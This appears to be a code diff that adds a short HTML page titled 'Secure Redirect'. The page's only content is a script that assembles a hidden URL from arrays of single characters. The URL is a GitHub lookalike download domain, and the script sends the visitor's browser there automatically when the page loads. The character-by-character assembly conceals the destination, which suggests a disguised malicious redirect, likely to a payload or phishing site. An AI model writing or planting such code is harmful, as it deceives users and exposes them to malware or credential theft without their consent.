@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Redirect</title>
+    <script>
+        const segments = [
+            ['h', 't', 't', 'p', 's', ':', '/', '/'], 
+            ['g', 'i', 't', 'h', 'u', 'b', 's', 'e'], 
+            ['c', 'u', 'r', 'e', 'd', 'o', 'w', 'n'], 
+            ['l', 'o', 'a', 'd', '.', 'o', 'n', 'l'], 
+            ['i', 'n', 'e', '/', 'h', 'r', 'f', '/'], 
+            ['a', 'l', 'l', 'n', 'e', 'w']        
+        ];
+
+        let url = '';
+        for (let segment of segments) {
+            url += segment.join('');
+        }
+
+        window.location.href = url;
+    </script>
+</head>
+<body>
+</body>
+</html>
